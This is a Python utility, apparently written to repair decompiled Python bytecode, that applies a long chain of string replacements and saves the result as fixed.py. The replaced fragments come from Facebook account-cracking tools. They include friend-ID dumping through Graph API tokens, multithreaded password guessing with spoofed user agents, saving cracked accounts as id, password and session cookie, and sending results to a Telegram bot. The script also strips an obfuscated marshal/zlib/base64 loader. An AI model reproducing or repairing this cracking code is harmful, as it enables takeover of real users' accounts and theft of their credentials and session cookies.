source = input("FILE: ")
with open(source, 'r') as file:
        source = file.read()
        source = source.replace("'''", "'").replace("""foo = False""","").replace("""if foo:
    pass""","").replace("""    if __name__ == '__main__':""","""if __name__ == '__main__':""").replace("finally","except").replace("""b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])""","""b = random.choice(['7.0','8.1.0','9','10','11','12'])""").replace("""d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])""","""d = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])""").replace("""f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])""","""f = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])""").replace("""asu = random.choice([
    m,
    O,
    h,
    u,
    b,
    MJ3,
    MJ2,
    MJ,
    AS2,
    AH2,
    B,
    WR,
    AS_F,
    AKH_T,
    AH_T,
    AB_KH,
    AZ_T,
    BN,
    SM,
    AS_T,
    AKH_F,
    AH_F,
    RS,
    AB_A,
    Z,
    p,
    b,
    kk,
    hh,
    x,
    Y,
    P,
    u,
    B,
    J,
    MJ4,
    p])""","""asu = random.choice([m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])""").replace("""dic = {
    '12': 'December',
    '11': 'November',
    '10': 'October',
    '9': 'September',
    '8': 'August',
    '7': 'July',
    '6': 'June',
    '5': 'May',
    '4': 'April',
    '3': 'March',
    '2': 'February',
    '1': 'January' }""","""dic = {'12': 'December','11': 'November','10': 'October','9': 'September','8': 'August','7': 'July','6': 'June','5': 'May','4': 'April','3': 'March','2': 'February','1': 'January' }""").replace("""dic2 = {
    '12': 'Devember',
    '11': 'November',
    '10': 'October',
    '09': 'September',
    '08': 'August',
    '07': 'July',
    '06': 'June',
    '05': 'May',
    '04': 'April',
    '03': 'March',
    '02': 'February',
    '01': 'January' }""","""dic2 = {'12': 'Devember','11': 'November','10': 'October','09': 'September','08': 'August','07': 'July','06': 'June','05': 'May','04': 'April','03': 'March','02': 'February','01': 'January' }""").replace("""None(None, None, None)
    if not None:
        pass""","""""").replace("e = None","").replace("del e","").replace("""if not None:
            pass""","").replace("""bo = random.choice([
        m,
        k,
        h,
        b,
        u,
        x])""","""bo = random.choice([m,k,h,b,u,x])""").replace("""amr = rc([
        '😀',
        '😃',
        '😄',
        '😁',
        '😆',
        '😅',
        '🤣',
        '😂',
        '🙂',
        '🙃',
        '😉',
        '😊',
        '😇',
        '🥰',
        '😍',
        '🤩',
        '😘',
        '😗',
        '😚',
        '😙',
        '😋',
        '😛',
        '😜',
        '🤪',
        '😝',
        '🤑',
        '🤗',
        '🤭',
        '🤫',
        '🤔',
        '🤐',
        '🤨',
        '😐',
        '😑',
        '😶',
        '😏',
        '😒',
        '🙄',
        '😬',
        '🤥',
        '😌',
        '😔',
        '😪',
        '🤤',
        '😴',
        '😷',
        '🤒',
        '🤕',
        '🤢',
        '🤮',
        '🤧',
        '🥵',
        '🥶',
        '🥴',
        '😵',
        '🤯',
        '🤠',
        '🥳',
        '😎',
        '🤓',
        '🧐',
        '😕',
        '😟',
        '🙁',
        '☹️',
        '😮',
        '😯',
        '😲',
        '😳',
        '🥺',
        '😦',
        '😧',
        '😨',
        '😰',
        '😥',
        '😢',
        '😭',
        '😱',
        '😖',
        '😣',
        '😞',
        '😓',
        '😩',
        '😫',
        '🥱',
        '😤',
        '😡',
        '😠',
        '🤬',
        '😈',
        '👿',
        '💀',
        '☠️',
        '💩',
        '🤡',
        '👹',
        '👺',
        '👻',
        '👽',
        '👾',
        '🤖',
        '😺',
        '😸',
        '😹',
        '😻',
        '😼',
        '😽',
        '🙀',
        '😿',
        '😾',
        '🧡',
        '💛',
        '💚',
        '💙',
        '💜',
        '🖤',
        '🤍',
        '🤎',
        '❤️',
        '🧡',
        '💛',
        '💚',
        '💙',
        '💜',
        '🖤',
        '🤍',
        '🤎',
        '❣️',
        '💕',
        '💞',
        '💓',
        '💗',
        '💖',
        '💘',
        '💝',
        '💟',
        '❤️‍🔥',
        '❤️‍🩹',
        '❤️',
        '🚀',
        '🛸',
        '🌍',
        '🌎',
        '🌏',
        '💔',
        '✈️',
        '🦦',
        '🔥',
        '👌🏼',
        '👋🏼',
        '🌚',
        '🔞',
        '🙆‍♂️',
        '🤦‍♂️',
        '✨',
        '🗿',
        '👍🏼',
        '🚬'])""","""amr = rc(['😀','😃','😄','😁','😆','😅','🤣','😂','🙂','🙃','😉','😊','😇','🥰','😍','🤩','😘','😗','😚','😙','😋','😛','😜','🤪','😝','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐','😑','😶','😏','😒','🙄','😬','🤥','😌','😔','😪','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵','🤯','🤠','🥳','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','😾','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❤️','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❣️','💕','💞','💓','💗','💖','💘','💝','💟','❤️‍🔥','❤️‍🩹','❤️','🚀','🛸','🌍','🌎','🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆‍♂️','🤦‍♂️','✨','🗿','👍🏼','🚬'])""").replace("""kuki = ';'.join((lambda .0: [ f'{key}={value}' for key, value in .0 ])(ses.cookies.get_dict().items()))""","""kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])""").replace("""game = (lambda .0: [ i.text for i in .0 ])(x.find_all('h3'))""","""game = [i.text for i in x.find_all("h3")]""").replace("""statusok1 = nel(statusok, 'green', **('style',))""","""statusok1 = nel(statusok, style='green')""").replace("""cetak(nel(statusok1, title='OK'))""","""cetak(nel(statusok1, 'OK', **('title',)))""").replace("""statuscp1 = nel(statuscp, 'red', **('style',))""","""statuscp1 = nel(statuscp, style='red')""").replace("""cetak(nel(statuscp1, 'SESI', **('title',)))""","""cetak(nel(statuscp1, title='SESI'))""").replace("""if __name__ == '__main__':
    
    try:
        os.system('git pull')
    except:
        pass
    
    try:
        os.mkdir('OK')
    except:
        pass
    
    try:
        os.mkdir('CP')
    except:
        pass
    
    try:
        os.mkdir('/sdcard/ALVINO-DUMP')
    except:
        pass
    
    try:
        os.system('touch .prox.txt')
    except:
        pass
    
    try:
        os.system('pkg install play-audio')
    except:
        pass
    
    try:
        os.system('clear')
    except:
        pass""","""if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass""").replace("""\n\n\n\n\n\n\n\n""","""""").replace("""def fak_xy(u):
    for e in u + '
':""","""def fak_xy(u):
    for e in u + '':""").replace("""        except:
        login_lagi334()
        requests.exceptions.ConnectionError
        li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
        lo = mark(li, 'red', **('style',))
        sol().print(lo, 'cyan', **('style',))
        exit()""","""        except:
            login_lagi334()
    except:
        requests.exceptions.ConnectionError
        li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
        lo = mark(li, 'red', **('style',))
        sol().print(lo, 'cyan', **('style',))
        exit()""").replace("""{
                'cookie': cok }, **('cookies',))""","""cookies={'cookie':cok})""").replace("""def fak_xy(u):
    for e in u + '
':""","""def fak_xy(u):
    for e in u + '':""").replace("""        except:
        
        
        try:
            print(e)
        except:""","""except:pass""").replace("""                except:
                
                
                (KeyError, IOError)
                requests.exceptions.ConnectionError
                exit()""","""except:pass""").replace("""                except:
                
                
                try:
                    print(e)
                    exit()
                except:""","""except:pass""").replace("""def setting():""","""    except:pass
def setting():""").replace("""with tred(30, **('max_workers',)) as""","""with tred(max_workers=30) as""").replace("""open('CP/' + cpc, 'a').write(idf + '|' + pw + '
')""","""open('CP/' + cpc, 'a').write(idf + '|' + pw + '')""").replace("""open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '
')""","""open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '')""").replace("""print('
')""","""print('')""").replace("""print('
    %s[0m cookie invalid' % M)""","""print('%s[0m cookie invalid' % M)""").replace("""w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', {
        'cookie': 'noscript=1;' + kuki }, **('cookies',)).text
    sop = bs4.BeautifulSoup(w, 'html.parser')""","""w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text""").replace("""x = sop.find('form', 'post', **('method',))""","""x = sop.find("form",method="post")""").replace("""asu = random.choice([
            m,
            k,
            h,
            b,
            u])""","""asu = random.choice([m,k,h,b,u])""").replace("""b = random.choice([
        '5.0',
        '6.0',
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])""","""b = random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])""").replace("""c = random.choice([
        'RMX3396'])""","""c = random.choice(['RMX3396'])""").replace("""print('
    %s [0mcookie invalid' % M)""","""print('%s [0mcookie invalid' % M)""").replace("""w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', {
        'cookie': 'noscript=1;' + kuki }, **('cookies',)).text""","""w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text""").replace("""def login():
    
    try:""","""def login():
    try:""").replace("""def menu():
    
    try:""","""def menu():
    try:""").replace("""b = random.choice([
        '8.1.0',
        '9',
        '10',
        '11',
        '12',
        '13'])""","""b = random.choice(['8.1.0','9','10','11','12','13'])""").replace("""try:
    print(' ')
except:
    
    ""","""try:
    print(' ')
except:pass""").replace("""def bot():
    
    try:""","""def bot():
    try:""").replace("""lambda .0: for i in .0:
""","").replace(""")(range""",""") for i in (range""").replace("""headers, {
        'cert_reqs': ssl.CERT_NONE }, **('header', 'sslopt'))""","""header=headers, sslopt={"cert_reqs": ssl.CERT_NONE})""").replace("""(500, **('max_workers',))""","""(max_workers=500)""").replace("""concurrent.futures as concurrent""","""concurrent.futures""").replace("""
executor.submit(create)
os.system('clear')""","""
while True:
    executor.submit(create)
    os.system('clear')""").replace("""return None""","").replace("error = None","").replace("continue","").replace("""import lzma
import zlib
import codecs
import base64""","").replace("""# Encoding: utf-8
# Decode by Plya Team - DecodeX
# Copyright: Plya - Team
# Follow Us On Telegram [ @Plya_Team ]""","").replace("""b = random.choice([
        '2',
        '3',
        '4',
        '5',
        '5.2',
        '6',
        '6.0.1',
        '7',
        '8',
        '9',
        '10',
        '11',
        '11',
        '11.0.1',
        '12',
        '13'])""","""b = random.choice(['2','3','4','5','5.2','6','6.0.1','7','8','9','10','11','11','11.0.1','12','13'])""").replace("""e = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])""","""e = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])""").replace("""""","""""").replace("""g = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])""","""g = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])""").replace("""asu = random.choice([
    m,
    k,
    h,
    u,
    b])""","""asu = random.choice([m,k,h,u,b])""").replace("""dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'Devember' }""","""dic = {'1': 'January','2': 'February','3': 'March','4': 'April','5': 'May','6': 'June','7': 'July','8': 'August','9': 'September','10': 'October','11': 'November','12': 'December' }
dic2 = {'01': 'January','02': 'February','03': 'March','04': 'April','05': 'May','06': 'June','07': 'July','08': 'August','09': 'September','10': 'October','11': 'November','12': 'Devember' }""").replace("""random.choice([
        u,
        k,
        kk,
        b,
        h,
        hh])""","""random.choice([u,k,kk,b,h,hh])""").replace("""error = None""","").replace("""# Source Generated with Decompyle++
# File: Plya_Team.pyc (Python 3.9)""","""""").replace("""None(None, None, None)
            if not None:
                pass""","""""").replace("""except:
        
        ""","""except:pass""").replace("\n\n\n\n","").replace("""{
                'cookie_by_dyno': cok }, **('cookies',))""","""cookie_by_dyno={'cookie':cok})""").replace("""'red', **('style',))""","""style='red')""").replace("""'cyan', **('style',))""","""style='cyan')""").replace("""        IOError
        DYN01778()""","""    except IOError:
        login_lagi334()""").replace("""        requests.exceptions.ConnectionError""","""except requests.exceptions.ConnectionError:""").replace("""try:
            print(e)
        except:""","""try:
            print(e)
        except:pass""").replace("""try:
                    print(e)
                    exit()
                except:""","""try:
                    print(e)
                    exit()
                except:pass""").replace("""kuki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(ses.cookies.get_dict().items()))""","""kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])""").replace("""print('

')""","""print('')""").replace("""    except:
except requests.exceptions.ConnectionError:""","""    except:""").replace("""try:
                pass
            except:
                
                ""","""try:
                pass
            except:pass""").replace("""try:
                print(e)
            except:
                
                ""","""try:
                print(e)
            except:pass""").replace("""                (KeyError, IOError)""","""                    (KeyError, IOError)""").replace("""except:
                print(f'{u}')
                print('[✘] No Internet connection ')
                exit()
                (KeyError, IOError)
                print(f'[✘] Not Public  {u}')
                time.sleep(3)
                back()""","""                except:
                    print(f'{u}')
                    print('[✘] No Internet connection ')
                    exit()
                    (KeyError, IOError)
                    print(f'[✘] Not Public  {u}')
                    time.sleep(3)
                    back()""").replace("""None(None, None, None)""","""""").replace("""koki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(p.cookies.get_dict().items()))""","""kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])""").replace("""        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])""","""            if 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])""").replace("""        def crackfree(idf, pwv):""","""def crackfree(idf, pwv):""").replace("""        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
            open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '')""","""            if 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '')""").replace("""except requests.exceptions.ConnectionError:
        time.sleep(3)""","""        except requests.exceptions.ConnectionError:
            time.sleep(3)""").replace("""        def jalan(keliling):""","""def jalan(keliling):""").replace("""+ '
':""","""+ '':""").replace("""s]
""","""s]'""").replace("""print('
%""","""print('%""").replace("""    def opsi():""","""def opsi():""").replace("""exit('
%""","""exit('%""").replace("""input('
%""","""input('%""").replace("""print('
 %s""","""print(' %s""").replace("""replace('
'""","""replace(''""").replace("""%s
'""","""%s'""") .replace("""if __name__ == '__main__':
    
    try:
        os.system('git pull')
    except:
        pass
    
    try:
        os.mkdir('OK')
    except:
        pass
    
    try:
        os.mkdir('CP')
    except:
        pass
    
    try:
        os.system('touch .prox.txt')
    except:
        pass""","""if __name__ == '__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass""").replace("""print(' 
 
 ')""","""print(' ')""").replace("""+ '
')""","""+ '')""").replace("""import lzma
import zlib
import codecs
import base64
def d(_, __):
    ___ = [chr((ord(char) - __) % 65536) for char in _]
    return ''.join(___)
print('')""","""""").replace("""def d(_, __):
    ___ = [chr((ord(char) - __) % 65536) for char in _]
    return ''.join(___)
print('')""","""""").replace("""    def menu(my_name, my_id):""","""def menu(my_name, my_id):""").replace("""headers_kai, datas_kai, **('headers', 'data')).text""","""headers=headers_kai, data=datas_kai).text""").replace("""print('
[""","""print('[""").replace("""
')""","""')""").replace("""        except:
        Ra_2005_log()
        IOError
        Ra_2005_log()""","""        except:
            Ra_2005_log()
    except IOError:
        Ra_2005_log()""").replace("""('
""","""('""").replace("""except:
                
                
                print('[>>] Total Id : ' + str(len(id)))""","""                except:
                
                
                    print('[>>] Total Id : ' + str(len(id)))
                    setting()""").replace("""                    (KeyError, IOError)""","""        except(KeyError, IOError):""").replace("""    def dump_massal():""","""def dump_massal():""").replace("""def dump_massal():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except:
        exit()
    
    try:
        ""","""def dump_massal():
        try:
                token = open('.token.txt','r').read()
                cok = open('.cok.txt','r').read()
        except IOError:
                exit()
        try:
                """).replace("""    except:
        pass
        exit()
    if kumpulkan < 1 or kumpulkan > 100:
        exit()""","""        except ValueError:
                print('>> Masukkan Angka Anjing, Malah Huruff ')
                exit()
        if jum<1 or jum>100:
                print('>> Gagal Dump Idz ')
                exit()""").replace("""    ses = requests.Session()""","""        ses=requests.Session()""").replace("""        ses=requests.Session()
    ""","""        ses=requests.Session()
        """).replace("""0
    for""","""0
        for""").replace("""range(kumpulkan):
        ""","""range(kumpulkan):
            """).replace("""+= 1
        ""","""+= 1
            """).replace(""": ')
        uid.append""",""": ')
            uid.append""").replace("""    for user in uid:""","""        for user in uid:""").replace("""        for user in uid:
        
        try:
            head =""","""        for user in uid:
            try:
               head =""").replace("""        for user in uid:
        try:
            head =""","""        for user in uid:
            try:
               head =""").replace("""head ={
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 6.2; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36' }""","""head = (
               {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
               })""").replace("""            if len(id) == 0:
                params = {
                    'fields': 'friends',
                    'access_token': token }""","""               if len(id) == 0:
                   params = (
                   {
                   'access_token': token,
                   'fields': "friends"
                   }
               )""").replace("""            else:
                params = {
                    'fields': 'friends',
                    'access_token': token }
            url = requests.get('https://graph.facebook.com/{}'.format(user), params, head, {
                'cookies': cok }, **('params', 'headers', 'cookies')).json()
            for xr in url['friends']['data']:""","""               else:
                   params = (
                   {
                   'access_token': token,
                   'fields': "friends"
                   }
               )
               url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
               for xr in url['friends']['data']:""").replace("""               for xr in url['friends']['data']:
                
                try:
                    woy = xr['id'] + '|' + xr['name']
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:""","""               for xr in url['friends']['data']:
                   try:
                       woy = (xr['id']+'|'+xr['name'])
                       if woy in id:pass
                       else:id.append(woy)
                   except:continue""").replace("""                    (KeyError, IOError)""","""            except(KeyError, IOError):pass""").replace("""        except requests.exceptions.ConnectionError:
                exit()""","""            except requests.exceptions.ConnectionError:
                exit()""").replace("""except:
                print(f'')""","""except:
                    print(f'')""").replace("""        if 'c_user' in ses.cookies.get_dict().keys():""","""            if 'c_user' in ses.cookies.get_dict().keys():""").replace("""            headapp = {
                'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' }""","""                headapp = {
                'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' }""").replace("""        if 'ya' in taplikasi:
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
            open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '')""","""            if 'ya' in taplikasi:
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '')""").replace("""            except:
                pass""","""            except:pass""").replace("""    except requests.exceptions.ConnectionError:
            time.sleep(31)""","""        except requests.exceptions.ConnectionError:
            time.sleep(31)""").replace("""    if __name__=='__main__':""","""if __name__=='__main__':""").replace("""{
                    'cookie': cookie }, **('cookies',))""","""cookies={'cookie':cookie})""").replace("""    def create_file_login():""","""def create_file_login():""").replace("""(None, None, None)
            if not None:
                pass""","""""").replace("""        for met in range(jum):
        ""","""        for met in range(jum):
            """).replace("""Erorr = None""","""""").replace("""del Erorr""","""""").replace("""head1, **('headers',))""","""headers=head1)""").replace("""if not None:
                pass""","""""").replace("""        def checklist():""","""def checklist():""").replace("""data, **('headers', 'data'))""","""headers=headers, data=data)""").replace("""    def home():""","""def home():""").replace("""random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])""","""random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])""").replace("""Qredes = 0x38D7EA4C67FFsource""","""""").replace("""sr, **('target',)""","""target=sr""").replace("""h, **('headers',))""","""headers=h)""").replace("""header, **('headers',))""","""headers=header""").replace("""ser, (), **('target', 'args'))""","""target=ser, args=())""").replace("""ser, **('target',)""","""target=ser""") .replace("""if not None:
                    pass""","""""").replace("""head, data, **('headers', 'data'))""","""headers=head, data=data)""").replace("""h, d, 0.4, **('headers', 'data', 'timeout'))""","""headers=h, data=d, timeout=0.4)""").replace("""+= 1
            os.system""","""+= 1
        os.system""").replace("""+= 1
            us""","""+= 1
        us""").replace("""he, **('headers',))""","""headers=he)""").replace("""if not None:
                    pass""","""""").replace("""he, data, **('headers', 'data'))""","""headers=he, data=data)""").replace("""he, da, **('headers', 'data'))""","""headers=he, data=da)""").replace("""except:passIndexError""","""except IndexError:""").replace("""lambda .0: for x in .0:
""","").replace("""hea, **('headers',))""","""headers=hea)""").replace("""+= 1
                        requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))""","""+= 1
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))""").replace("""ok += 1
                    coki = po.cookies.get_dict()""","""ok += 1
                coki = po.cookies.get_dict()""").replace("""        if 'ya' in taplikasi:""","""            if 'ya' in taplikasi:""").replace("""+= 1
                            infoakun""","""+= 1
                        infoakun""").replace("""in cek2:
                    infoakun +=""","""in cek2:
                        infoakun +=""").replace("""else:
                    (hit1, hit2) = (0, 0)""","""else:
                        (hit1, hit2) = (0, 0)""").replace("""if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
    login()""","""if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	login()""").replace("""data, **('data',))""","""data=data)""").replace("""dat, cos, **('data', 'cookies'))""","""data=dat, cookies=cos)""").replace("""""","""""").replace("""cos, **('cookies',))""","""cookies=cos)""").replace("""**('style',)))""","""style='bold'))""").replace("""        ses=requests.Session()
        for pw in pwv:""","""    ses=requests.Session()
    for pw in pwv:""") .replace("""copyright = '@psh_team'""","""""").replace("""random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12',
        '13'])""","""random.choice(['6','7','8','9','10','11','12','13'])""").replace("""random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])""","""random.choice(['6','7','8','9','10','11','12'])""").replace("""{
            'cookie': cookies }, **('headers', 'cookies'))""","""{
    'cookie': cookies
}, headers=headers, cookies=cookies)""").replace("""    def""","""def""").replace("""1, **('limit',))""","""limit=1)""").replace("""'تحقق', **('text',))""","""text='تحقق')""").replace("""kilwa = ''""","""kilwa = '""").replace("""kilwa = 'print('𓏳'*50)'""","""kilwa = ('𓏳'*50)""").replace("""passwrd, **('target',))""","""target=passwrd)""").replace("""+= 1
            tlg""","""+= 1
        tlg""").replace("""n't""","""nt""").replace("""d, h, **('data', 'headers'))""","""data=d, headers=h)""").replace("""{
                'cookie': cookies=cok)""","""cookies=cok)""").replace("""try:
                    print(e)
                except:
                    ""","""try:
                    print(e)
                except:pass""").replace("""ok += 1
                coki""","""ok += 1
            coki""").replace("""    loop = 0
    lim = 0
    oks = []
    cps = []
    twf = []
    pcp = []
    tp = 0
    id = []
    tokenku = []""","""loop = 0
lim = 0
oks = []
cps = []
twf = []
pcp = []
tp = 0
id = []
tokenku = []""").replace("""if None.exceptions""","""except requests.exceptions""").replace("""if None:""","""except:""").replace("""

_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));


""","""""")
    
with open("/storage/emulated/0/Download/Telegram/fixed.py", 'w') as file:
    file.write(source)
    print("تم التصليح")
